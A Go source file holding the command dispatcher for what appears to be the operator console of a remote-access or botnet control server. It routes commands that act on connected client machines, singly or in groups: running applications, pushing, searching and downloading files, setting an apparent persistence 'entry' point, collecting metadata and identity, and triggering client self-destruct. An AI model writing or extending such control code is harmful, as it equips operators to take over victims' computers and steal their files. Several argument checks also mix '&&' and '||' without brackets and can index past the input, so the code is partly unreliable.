package connection

import (
	"fmt"
	"net"
	"os"
	h "server/util/header"
	"strconv"
	"strings"
)

/*
*Command Router:
uses session *Server pointer methods based on parsed input commands passes conn for reference
*/
func handleServer(session *Server, input string, conn net.Conn) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		fmt.Println(h.E, "Unknown command")
		return
	}

	command := parts[0]

	switch command {
	case "help":
		h.ListHelp()
	case "h":
		h.ListHelp()
	case "clear":
		h.ClearScreen()

	case "count":
		session.ShowActiveConns()

	case "list":
		session.ListClients()

	case "check":
		if len(parts) > 1 {
			if parts[1] == "active"{
				session.CheckActiveClient()
			}else if parts[1] == "group"{
				session.CheckClientGroup()
			}
		} else {
			fmt.Println(h.E, "Unknown command")
		}

	case "set":
		if len(parts) > 1 {
			if parts[1] == "active" {
				if len(parts) > 2 {
					clientNum, err := strconv.Atoi(parts[2])
					if err != nil {
						fmt.Println(h.E, "Invalid client number")
						return
					}
					session.SelectActiveClient(int64(clientNum),)
				} else {
					fmt.Println(h.E, "Missing client number")
				}
			}else if parts[1] == "group"{
				if len(parts) > 2 {
					amount, err := strconv.Atoi(parts[2])
					if err != nil {
						fmt.Println(h.E, "Invalid group amount")
						return
					}
					session.SetClientGroup(amount,)
				} else {
					fmt.Println(h.E, "Missing group amount")
				}
			} else {
				fmt.Println(h.E, "Unknown command")
			}
		} else {
			fmt.Println(h.E, "Missing set command arguments")
		}

	

	case "ping":
		addr := ""
		if len(parts) < 2{
			fmt.Println(h.E, "Invalid Ping command")
			return
		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
			addr = parts[2]
			session.ClientPing(addr, parts[1],)
		} else if len(parts) == 2 {
			addr = parts[1]
			session.ClientPing(addr, "",)
		} else {
			fmt.Println(h.E, "Invalid ping command")
			return
		}

	case "run":
		file := ""
		if len(parts) < 2{
			fmt.Println(h.E, "Invalid run command")
			return
		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
			file = parts[2]
			session.ClientRunApp(file, parts[1],)
		} else if len(parts) == 2 {
			file = parts[1]
			session.ClientRunApp(file, "",)
		}
		

	case "send":
		file := ""
		if len(parts) < 2{
			fmt.Println(h.E, "Invalid send command")
			return
		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
			file = parts[2]
			session.ServerSendFile(file, parts[1],)
		} else if len(parts) == 2 {
			file = parts[1]
			session.ServerSendFile(file, "",)
		}
		

	case "search":
		file := ""
		if len(parts) < 2{
			fmt.Println(h.E, "Invalid search command")
			return
		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
			file = parts[2]
			session.ClientSearchFile(file, parts[1])
		} else if len(parts) == 2 {
			file = parts[1]
			session.ClientSearchFile(file, "",)
		}
		

	case "download":
		file := ""
		if len(parts) < 2{
			fmt.Println(h.E, "Invalid download command")
			return
		}else if len(parts) > 2 && parts[1] == "-g" ||  parts[1] == "-a" {
			file = parts[2]
			session.ClientDownFile(file, parts[1],)
		} else if len(parts) == 2 {
			file = parts[1]
			session.ClientDownFile(file, "")
		}

	case "entry":
		if len(parts) > 1 {
			if parts[1] == "-g" ||  parts[1] == "-a"{
				session.ClientEntryPoint(parts[1])
			}else{
			fmt.Println(h.E, "Invalid entry command")
			}
		}else{
			session.ClientEntryPoint("")
		}

	case "blowup":
		if len(parts) > 1 {
			if parts[1] == "-g" ||  parts[1] == "-a"{
				session.ClientSelfDestruct(parts[1],)
			}else{
			fmt.Println(h.E, "Invalid entry command")
			}
		}else{
			session.ClientSelfDestruct("")
		}

	case "metadata":
		if len(parts) > 1 {
			if parts[1] == "-g" ||  parts[1] == "-a"{
				session.GetMetaData(parts[1])
			}else{
			fmt.Println(h.E, "Invalid metadata command")
			}
		}else{
			session.GetMetaData("")
		}

	
	case "echo":
		session.Echo()

	case "whoami":
		if len(parts) > 1 {
			if parts[1] == "-g" ||  parts[1] == "-a"{
				session.WhoAmI(parts[1])
			}else{
			fmt.Println(h.E, "Invalid metadata command")
			}
		}else{
			session.WhoAmI("")
		}

	case "exit":
		fmt.Println(h.I, "goodbye!")
		os.Exit(0)

	default:
		fmt.Println(h.E, "Unknown command")
	}
}
